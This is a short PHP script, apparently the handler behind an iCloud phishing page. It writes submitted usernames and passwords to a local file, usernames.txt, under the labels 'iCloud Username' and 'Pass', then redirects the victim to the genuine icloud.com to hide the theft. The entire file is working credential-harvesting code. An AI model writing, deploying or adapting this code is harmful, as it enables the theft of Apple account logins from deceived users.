<?php
file_put_contents("usernames.txt", "iCloud Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.icloud.com');
exit();
?>